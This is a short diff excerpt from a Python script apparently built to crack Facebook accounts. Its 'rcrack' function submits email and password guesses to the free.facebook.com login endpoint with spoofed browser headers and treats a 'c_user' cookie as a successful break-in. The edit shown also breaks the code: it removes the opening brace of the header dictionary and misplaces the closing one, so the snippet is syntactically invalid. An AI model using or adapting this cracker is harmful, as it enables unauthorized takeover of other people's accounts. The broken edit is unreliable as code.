@@ -297,7 +297,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'free.facebook.com',
+            header_freefb = "authority": 'free.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -316,7 +316,7 @@ def rcrack(uid,pwx,tl):
             "priority": 'u=0',
             'cross-origin-resource-policy': 'cross-origin',
             "upgrade-insecure-requests": '1',
-            "user-agent": 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
+            "user-agent": 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0'}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
